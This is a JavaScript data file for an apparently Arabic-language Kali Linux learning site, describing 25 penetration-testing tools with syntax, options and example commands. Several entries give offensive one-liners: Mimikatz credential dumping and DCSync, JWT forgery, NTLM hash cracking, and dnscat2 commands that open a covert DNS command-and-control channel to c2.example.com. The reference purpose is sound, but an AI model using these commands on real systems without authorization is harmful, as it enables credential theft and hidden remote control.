// ============================================================
// KALI ACADEMY - COMMANDS DATABASE PART 17
// 25 BRAND NEW UNIQUE COMMANDS - IDs 1536-1560
// ============================================================
window.CMD_PART17 = [
  {
    id: 1536,
    name: 'ghauri',
    cat: 'web',
    level: 'intermediate',
    syntax: 'ghauri -u <url> [options]',
    short: 'أداة SQL injection متقدمة بـ Python',
    desc: 'بديل محسّن لـ SQLMap يدعم اكتشاف واستغلال SQL injection بكفاءة عالية.',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '--dbs', desc: 'تعداد قواعد البيانات' },
      { flag: '--dump', desc: 'تفريغ البيانات' }
    ],
    examples: [
      { cmd: 'ghauri -u "http://target.com/item?id=1" --dbs', desc: 'تعداد قواعد البيانات' }
    ],
    tips: 'ghauri يدعم WAF bypass ويعطي نتائج دقيقة أكثر من sqlmap في بعض الحالات.',
    related: ['sqlmap', 'nosqlmap', 'burpsuite']
  },
  {
    id: 1537,
    name: 'nosqlmap',
    cat: 'web',
    level: 'intermediate',
    syntax: 'nosqlmap',
    short: 'اختبار حقن NoSQL (MongoDB, CouchDB)',
    desc: 'أداة لاكتشاف واستغلال ثغرات NoSQL injection في قواعد بيانات MongoDB وCouchDB.',
    options: [],
    examples: [
      { cmd: 'nosqlmap', desc: 'تشغيل nosqlmap تفاعلياً' }
    ],
    tips: 'MongoDB عرضة لـ injection باستخدام $where وoperators خاصة.',
    related: ['sqlmap', 'burpsuite', 'wfuzz']
  },
  {
    id: 1538,
    name: 'xsstrike',
    cat: 'web',
    level: 'intermediate',
    syntax: 'xsstrike -u <url>',
    short: 'اكتشاف XSS متقدم بالذكاء الاصطناعي',
    desc: 'أداة XSS متقدمة تستخدم fuzzing ذكياً وتحليل السياق لاكتشاف XSS.',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '--crawl', desc: 'الزحف التلقائي' },
      { flag: '--blind', desc: 'اكتشاف Blind XSS' }
    ],
    examples: [
      { cmd: 'xsstrike -u "http://target.com/search?q=test"', desc: 'فحص XSS' },
      { cmd: 'xsstrike -u http://target.com --crawl', desc: 'مسح مع الزحف' }
    ],
    tips: 'xsstrike أذكى من dalfox في الأهداف التي تطبق WAF.',
    related: ['dalfox', 'burpsuite', 'xsser']
  },
  {
    id: 1539,
    name: 'arachni',
    cat: 'web',
    level: 'intermediate',
    syntax: 'arachni <url>',
    short: 'إطار مسح أمان تطبيقات الويب',
    desc: 'إطار مسح شامل لتطبيقات الويب يكشف عشرات أنواع الثغرات.',
    options: [
      { flag: '--output-report-path=<file>', desc: 'مسار التقرير' },
      { flag: '--checks=*', desc: 'تشغيل كل الفحوصات' }
    ],
    examples: [
      { cmd: 'arachni http://target.com', desc: 'فحص شامل' },
      { cmd: 'arachni http://target.com --output-report-path=report.afr', desc: 'مع حفظ التقرير' }
    ],
    tips: 'arachni يوفر واجهة ويب لإدارة الفحوصات.',
    related: ['nikto', 'zaproxy', 'wapiti']
  },
  {
    id: 1540,
    name: 'zaproxy',
    cat: 'web',
    level: 'intermediate',
    syntax: 'zap.sh [options]',
    short: 'OWASP ZAP - ماسح أمان ويب شامل',
    desc: 'OWASP Zed Attack Proxy - أداة مجانية لاختبار أمان تطبيقات الويب من OWASP.',
    options: [
      { flag: '-daemon', desc: 'تشغيل كـ daemon' },
      { flag: '-port <port>', desc: 'منفذ proxy' },
      { flag: '-quickurl <url>', desc: 'فحص سريع لرابط' }
    ],
    examples: [
      { cmd: 'zap.sh -quickurl http://target.com', desc: 'فحص سريع' },
      { cmd: 'zap.sh -daemon -port 8090', desc: 'تشغيل كـ daemon' }
    ],
    tips: 'ZAP يمكن دمجه في CI/CD pipeline عبر API.',
    related: ['burpsuite', 'nikto', 'arachni']
  },
  {
    id: 1541,
    name: 'jwt-tool',
    cat: 'web',
    level: 'intermediate',
    syntax: 'jwt_tool <token>',
    short: 'اختبار وكسر JSON Web Tokens',
    desc: 'أداة متخصصة لاختبار وتزوير واستغلال JSON Web Tokens (JWT).',
    options: [
      { flag: '-M pb2', desc: 'هجوم playbook (fuzz)' },
      { flag: '-C -d <wordlist>', desc: 'كسر الـ secret' },
      { flag: '-I -pc <claim> -pv <value>', desc: 'حقن claim محدد' }
    ],
    examples: [
      { cmd: 'jwt_tool eyJ...', desc: 'تحليل JWT token' },
      { cmd: 'jwt_tool eyJ... -C -d wordlist.txt', desc: 'كسر الـ secret' },
      { cmd: 'jwt_tool eyJ... -I -pc username -pv admin', desc: 'تزوير claim' }
    ],
    tips: 'اختبر None algorithm وHS256/RS256 confusion attacks.',
    related: ['burpsuite', 'hashcat', 'ffuf']
  },
  {
    id: 1542,
    name: 'smbmap',
    cat: 'network',
    level: 'intermediate',
    syntax: 'smbmap -H <host> [options]',
    short: 'تعداد مشاركات SMB والوصول إليها',
    desc: 'يعدد مشاركات SMB ويكشف الأذونات ويدعم تنفيذ الأوامر عبر SMB.',
    options: [
      { flag: '-H <host>', desc: 'الهدف' },
      { flag: '-u <user>', desc: 'اسم المستخدم' },
      { flag: '-p <pass>', desc: 'كلمة المرور' },
      { flag: '-R', desc: 'عرض محتوى المشاركات بشكل تكراري' },
      { flag: '-x <cmd>', desc: 'تنفيذ أمر' }
    ],
    examples: [
      { cmd: 'smbmap -H 192.168.1.100 -u anonymous', desc: 'فحص مجهول' },
      { cmd: 'smbmap -H 192.168.1.100 -u admin -p password -R', desc: 'قراءة المشاركات بالتفصيل' }
    ],
    tips: 'smbmap يعرض permissions (R/W) لكل مشاركة - ابحث عن المشاركات القابلة للكتابة.',
    related: ['smbclient', 'crackmapexec', 'enum4linux']
  },
  {
    id: 1543,
    name: 'mimikatz-cmds',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'mimikatz # sekurlsa::logonpasswords',
    short: 'أوامر Mimikatz للحصول على كلمات المرور',
    desc: 'مجموعة أوامر Mimikatz الأكثر استخداماً لاستخراج كلمات المرور والهاشات وتذاكر Kerberos.',
    options: [
      { flag: 'sekurlsa::logonpasswords', desc: 'استخراج كلمات المرور من الذاكرة' },
      { flag: 'sekurlsa::wdigest', desc: 'استخراج كلمات مرور WDigest' },
      { flag: 'lsadump::sam', desc: 'استخراج SAM database' },
      { flag: 'kerberos::list /export', desc: 'تصدير تذاكر Kerberos' }
    ],
    examples: [
      { cmd: 'privilege::debug; sekurlsa::logonpasswords', desc: 'استخراج كلمات المرور' },
      { cmd: 'lsadump::dcsync /domain:domain.local /user:Administrator', desc: 'DCSync attack' }
    ],
    tips: 'privilege::debug مطلوب قبل كل عمليات Mimikatz.',
    related: ['mimikatz', 'impacket-secretsdump', 'crackmapexec']
  },
  {
    id: 1544,
    name: 'sharphound',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'SharpHound.exe [options]',
    short: 'جمع بيانات Active Directory لـ BloodHound',
    desc: 'أداة جمع البيانات الرسمية لـ BloodHound تعمل على Windows.',
    options: [
      { flag: '-c All', desc: 'جمع كل أنواع البيانات' },
      { flag: '--stealth', desc: 'وضع التخفي' },
      { flag: '-d <domain>', desc: 'النطاق المستهدف' }
    ],
    examples: [
      { cmd: 'SharpHound.exe -c All -d domain.local', desc: 'جمع شامل' },
      { cmd: 'SharpHound.exe --stealth -c DCOnly', desc: 'جمع خفي من DC' }
    ],
    tips: 'استخدم -Loop لجمع البيانات بشكل دوري لرصد التغييرات.',
    related: ['bloodhound', 'crackmapexec', 'powerview']
  },
  {
    id: 1545,
    name: 'spiderfoot',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'spiderfoot -s <target>',
    short: 'OSINT آلي لجمع المعلومات',
    desc: 'أداة OSINT آلية تجمع معلومات من مئات المصادر بشكل تلقائي.',
    options: [
      { flag: '-s <target>', desc: 'الهدف (IP/Domain/Email)' },
      { flag: '-l <host:port>', desc: 'تشغيل واجهة ويب' },
      { flag: '-t <types>', desc: 'أنواع البيانات المطلوبة' }
    ],
    examples: [
      { cmd: 'spiderfoot -s target.com -l 127.0.0.1:5001', desc: 'تشغيل مع واجهة ويب' }
    ],
    tips: 'SpiderFoot HX النسخة السحابية أسرع وأشمل.',
    related: ['maltego', 'recon-ng', 'theHarvester']
  },
  {
    id: 1546,
    name: 'metagoofil',
    cat: 'recon',
    level: 'beginner',
    syntax: 'metagoofil -d <domain> -t <filetype> -l <limit>',
    short: 'استخراج metadata من ملفات عامة',
    desc: 'يبحث في Google عن ملفات تابعة للنطاق ويستخرج metadata منها.',
    options: [
      { flag: '-d <domain>', desc: 'النطاق المستهدف' },
      { flag: '-t <type>', desc: 'نوع الملف (pdf, doc, xls)' },
      { flag: '-l <limit>', desc: 'عدد النتائج' }
    ],
    examples: [
      { cmd: 'metagoofil -d target.com -t pdf -l 20', desc: 'جمع metadata من PDFs' },
      { cmd: 'metagoofil -d target.com -t doc,xls,pdf -l 50', desc: 'جمع من أنواع متعددة' }
    ],
    tips: 'PDF metadata قد تكشف أسماء موظفين ومسارات ملفات داخلية.',
    related: ['theHarvester', 'photon', 'exiftool']
  },
  {
    id: 1547,
    name: 'phoneinfoga',
    cat: 'recon',
    level: 'beginner',
    syntax: 'phoneinfoga scan -n <number>',
    short: 'استطلاع OSINT لأرقام الهاتف',
    desc: 'يجمع معلومات OSINT عن أرقام الهاتف من مصادر متعددة.',
    options: [
      { flag: 'scan -n <number>', desc: 'فحص رقم هاتف' },
      { flag: 'serve', desc: 'تشغيل واجهة ويب' }
    ],
    examples: [
      { cmd: 'phoneinfoga scan -n +1234567890', desc: 'فحص رقم هاتف' }
    ],
    tips: 'استخدم التنسيق الدولي مع رمز البلد.',
    related: ['theHarvester', 'sherlock', 'maltego']
  },
  {
    id: 1548,
    name: 'eyewitness',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'eyewitness -f <urls.txt>',
    short: 'أخذ لقطات شاشة لخدمات الويب',
    desc: 'يأخذ لقطات شاشة لقائمة من URLs لخدمات HTTP وHTTPS ويولد تقريراً.',
    options: [
      { flag: '-f <file>', desc: 'ملف URLs' },
      { flag: '-d <dir>', desc: 'مجلد الإخراج' },
      { flag: '--prepend-https', desc: 'إضافة https://' }
    ],
    examples: [
      { cmd: 'eyewitness -f urls.txt -d screenshots/', desc: 'لقطات شاشة لقائمة URLs' }
    ],
    tips: 'eyewitness مفيد لتحديد الأهداف الواعدة بسرعة في بيئات كبيرة.',
    related: ['httpx', 'aquatone', 'gowitness']
  },
  {
    id: 1549,
    name: 'dradis',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'start-dradis',
    short: 'إطار كتابة تقارير اختبار الاختراق',
    desc: 'إطار تعاوني لتنظيم نتائج اختبار الاختراق وكتابة التقارير.',
    options: [],
    examples: [
      { cmd: 'start-dradis', desc: 'تشغيل Dradis' },
      { cmd: 'http://localhost:3000', desc: 'فتح واجهة الويب' }
    ],
    tips: 'Dradis يدعم استيراد نتائج nmap وBurp وNessus مباشرة.',
    related: ['cherrytree', 'magictree', 'faraday']
  },
  {
    id: 1550,
    name: 'cherrytree',
    cat: 'forensics',
    level: 'beginner',
    syntax: 'cherrytree',
    short: 'تنظيم ملاحظات اختبار الاختراق',
    desc: 'تطبيق تدوين ملاحظات هرمي مناسب لتنظيم نتائج اختبار الاختراق.',
    options: [],
    examples: [
      { cmd: 'cherrytree', desc: 'تشغيل CherryTree' }
    ],
    tips: 'استخدم templates جاهزة لـ pentest في CherryTree من GitHub.',
    related: ['dradis', 'obsidian', 'notion']
  },
  {
    id: 1551,
    name: 'faraday',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'faraday-client',
    short: 'إطار إدارة اختبار الاختراق التعاوني',
    desc: 'منصة متكاملة لإدارة اختبارات الاختراق التعاونية وتوليد التقارير.',
    options: [],
    examples: [
      { cmd: 'faraday-client', desc: 'تشغيل Faraday client' }
    ],
    tips: 'Faraday يدعم استيراد نتائج أكثر من 70 أداة أمنية.',
    related: ['dradis', 'cherrytree', 'vulnscan-nmap']
  },
  {
    id: 1552,
    name: 'netexec',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'netexec <protocol> <target> [options]',
    short: 'خليفة CrackMapExec المطور',
    desc: 'نسخة محدثة من CrackMapExec (CME) باسم NetExec تدعم بروتوكولات إضافية.',
    options: [
      { flag: 'smb', desc: 'استخدام SMB' },
      { flag: 'winrm', desc: 'استخدام WinRM' },
      { flag: 'ldap', desc: 'استخدام LDAP' },
      { flag: '-u', desc: 'اسم المستخدم' },
      { flag: '-p', desc: 'كلمة المرور' }
    ],
    examples: [
      { cmd: 'netexec smb 192.168.1.0/24', desc: 'اكتشاف SMB' },
      { cmd: 'netexec ldap 192.168.1.10 -u user -p pass --users', desc: 'تعداد LDAP users' }
    ],
    tips: 'نفس syntax لـ CrackMapExec مع دعم LDAP وFTP إضافي.',
    related: ['crackmapexec', 'evil-winrm', 'impacket-psexec']
  },
  {
    id: 1553,
    name: 'pipal',
    cat: 'password',
    level: 'intermediate',
    syntax: 'pipal <wordlist>',
    short: 'تحليل إحصائي لكلمات المرور',
    desc: 'يحلل قوائم كلمات المرور ويقدم إحصائيات مفيدة لفهم patterns كلمات المرور.',
    options: [],
    examples: [
      { cmd: 'pipal passwords.txt', desc: 'تحليل قائمة كلمات المرور' }
    ],
    tips: 'pipal مفيد لفهم سياسات كلمات المرور في المؤسسات.',
    related: ['cupp', 'cewl', 'wordlist-tools']
  },
  {
    id: 1554,
    name: 'cupp',
    cat: 'password',
    level: 'beginner',
    syntax: 'cupp [options]',
    short: 'توليد قوائم كلمات مرور مخصصة للأفراد',
    desc: 'يولد قائمة كلمات مرور مخصصة للهدف بناءً على معلومات شخصية مثل الاسم وتاريخ الميلاد.',
    options: [
      { flag: '-i', desc: 'وضع تفاعلي لإدخال المعلومات' },
      { flag: '-l', desc: 'تنزيل قوائم كبيرة' },
      { flag: '-a', desc: 'تحليل ملف الحاجز' }
    ],
    examples: [
      { cmd: 'cupp -i', desc: 'توليد قائمة بشكل تفاعلي' }
    ],
    tips: 'المعلومات من LinkedIn وFacebook مصدر ممتاز لـ cupp.',
    related: ['pipal', 'cewl', 'crunch']
  },
  {
    id: 1555,
    name: 'haveibeenpwned-cli',
    cat: 'recon',
    level: 'beginner',
    syntax: 'hibp-cli check <email>',
    short: 'التحقق من تسريب كلمات المرور',
    desc: 'يتحقق من وجود عنوان بريد إلكتروني أو كلمة مرور في قواعد بيانات التسريبات.',
    options: [],
    examples: [
      { cmd: 'hibp check email@example.com', desc: 'فحص بريد إلكتروني' }
    ],
    tips: 'استخدم Have I Been Pwned API للبحث عن كلمات المرور المسربة.',
    related: ['theHarvester', 'sherlock', 'recon-ng']
  },
  {
    id: 1556,
    name: 'bulk-extractor',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'bulk_extractor -o <output> <input>',
    short: 'استخراج معلومات من images بشكل جماعي',
    desc: 'يستخرج أنواعاً متعددة من البيانات (emails, URLs, credit cards) من disk images أو ملفات.',
    options: [
      { flag: '-o <dir>', desc: 'مجلد الإخراج' },
      { flag: '-R', desc: 'معالجة تكرارية' },
      { flag: '-e <scanner>', desc: 'تفعيل scanner محدد' }
    ],
    examples: [
      { cmd: 'bulk_extractor -o output/ disk.img', desc: 'استخراج من disk image' },
      { cmd: 'bulk_extractor -R -o output/ /suspicious_dir/', desc: 'فحص مجلد' }
    ],
    tips: 'bulk_extractor يجد emails و URLs و credit cards تلقائياً.',
    related: ['foremost', 'volatility3', 'strings']
  },
  {
    id: 1557,
    name: 'hashdeep',
    cat: 'forensics',
    level: 'beginner',
    syntax: 'hashdeep [options] <files>',
    short: 'حساب والتحقق من هاشات الملفات',
    desc: 'يحسب ويتحقق من هاشات ملفات متعددة (MD5, SHA1, SHA256) لضمان سلامة الملفات.',
    options: [
      { flag: '-r', desc: 'معالجة تكرارية' },
      { flag: '-a', desc: 'وضع المقارنة' },
      { flag: '-k <file>', desc: 'ملف مرجعي للمقارنة' }
    ],
    examples: [
      { cmd: 'hashdeep -r /important/files/ > hashes.txt', desc: 'إنشاء قاعدة هاشات' },
      { cmd: 'hashdeep -r -a -k hashes.txt /important/files/', desc: 'التحقق من التغييرات' }
    ],
    tips: 'استخدم hashdeep لضمان سلامة الأدلة الجنائية.',
    related: ['md5sum', 'sha256sum', 'aide']
  },
  {
    id: 1558,
    name: 'hashcat-rules',
    cat: 'password',
    level: 'intermediate',
    syntax: 'hashcat -m <mode> -r <rules> <hash> <wordlist>',
    short: 'استخدام قواعد hashcat لتحويل كلمات المرور',
    desc: 'قواعد hashcat تحول كلمات المرور بطرق شائعة لزيادة فاعلية الكسر.',
    options: [
      { flag: '-r best64.rule', desc: 'أفضل 64 قاعدة' },
      { flag: '-r OneRuleToRuleThemAll.rule', desc: 'قاعدة شاملة مجتمعية' },
      { flag: '-r d3ad0ne.rule', desc: 'قاعدة d3ad0ne' }
    ],
    examples: [
      { cmd: 'hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule', desc: 'كسر NTLM بقاعدة best64' },
      { cmd: 'hashcat -m 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule', desc: 'MD5 مع قاعدة شاملة' }
    ],
    tips: 'القواعد تضاعف فاعلية الكسر دون زيادة كبيرة في الوقت.',
    related: ['hashcat', 'john', 'crunch']
  },
  {
    id: 1559,
    name: 'tcpflow',
    cat: 'network',
    level: 'intermediate',
    syntax: 'tcpflow [options] <filter>',
    short: 'تسجيل وتحليل جلسات TCP',
    desc: 'يسجل ويعيد بناء جلسات TCP من التقاط الشبكة، مفيد لتحليل البيانات.',
    options: [
      { flag: '-i <interface>', desc: 'واجهة الشبكة' },
      { flag: '-r <pcap>', desc: 'قراءة من ملف PCAP' },
      { flag: '-c', desc: 'طباعة في الـ console' }
    ],
    examples: [
      { cmd: 'tcpflow -i eth0', desc: 'التقاط مباشر' },
      { cmd: 'tcpflow -r capture.pcap', desc: 'تحليل ملف PCAP' }
    ],
    tips: 'tcpflow يعيد بناء الجلسات كاملة وليس فقط الحزم.',
    related: ['tcpdump', 'wireshark', 'tshark']
  },
  {
    id: 1560,
    name: 'dnscat2',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'dnscat2-server <domain>',
    short: 'نفق Command & Control عبر DNS',
    desc: 'أداة لإنشاء قنوات C2 سرية عبر بروتوكول DNS لتجاوز جدران الحماية.',
    options: [],
    examples: [
      { cmd: 'dnscat2-server c2.example.com', desc: 'تشغيل الخادم' },
      { cmd: 'dnscat2 --dns server=c2.example.com,port=53', desc: 'تشغيل العميل' }
    ],
    tips: 'DNS tunneling يعمل في بيئات تحظر كل المنافذ ماعدا 53.',
    related: ['iodine', 'dnschef', 'chisel']
  }
];
